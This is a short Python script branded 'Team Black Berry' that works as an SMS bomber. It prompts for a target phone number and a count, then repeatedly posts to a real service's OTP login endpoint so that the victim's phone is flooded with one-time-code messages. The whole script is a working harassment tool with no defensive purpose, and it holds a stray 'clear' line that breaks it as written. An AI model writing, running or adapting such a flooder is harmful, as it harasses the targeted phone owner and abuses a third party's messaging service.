import requests
clear

from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
print("""



                    T_B_B
         TÊÃM BLÅÇK BËRRY
         Created by: ÅSB ÃSHÏS BÎSWÅS
                    TBB C_O
                     
  Facebook : https://www.facebook.com/profile.php?id=100074238783251
 

  """)



                                                        
number=str(input("Enter Terget Number:+88 "))
amount=int(input("Enter Terget Amount: "))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"


data = "phone="+number


for i in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(i+1)+"SMS SENT")
